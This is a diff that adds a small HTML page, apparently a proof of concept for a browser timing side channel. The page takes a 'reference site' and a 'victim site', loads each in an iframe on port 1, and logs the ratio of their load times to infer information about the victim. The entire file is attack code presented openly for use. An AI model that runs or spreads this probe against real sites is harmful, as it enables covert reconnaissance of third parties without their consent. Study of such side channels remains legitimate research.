@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Empty Page</title>
+</head>
+<body>
+	<form>
+		<label for="referenceSite">Reference Site:</label>
+		<input type="text" id="referenceSite" name="referenceSite"><br><br>
+		<label for="victimSite">Victim Site:</label>
+		<input type="text" id="victimSite" name="victimSite"><br><br>
+		<input type="button" value="Start Computation" onclick="startComputation()">
+	</form>
+	<script>
+		function startComputation() {
+			var referenceSite = document.getElementById("referenceSite").value;
+			var victimSite = document.getElementById("victimSite").value;
+			setTimeout(function() {
+				var time_0 = performance.now();
+				var iframe_ref = document.createElement("iframe");
+				iframe_ref.src = "http://" + referenceSite + ":1";
+				iframe_ref.onload = function() {
+					var time_ref = performance.now();
+					var iframe_vtm = document.createElement("iframe");
+					iframe_vtm.src = "http://" + victimSite + ":1";
+					iframe_vtm.onload = function() {
+						var time_vtm = performance.now();
+						var r = (time_vtm - time_ref) / (time_ref - time_0);
+						console.log(r); // print r to console
+						// you can also write r to a file here
+					}
+					document.body.appendChild(iframe_vtm);
+				}
+				document.body.appendChild(iframe_ref);
+			}, 5000); // wait for 5 seconds before performing the computation
+		}
+	</script>
+</body>
+</html>
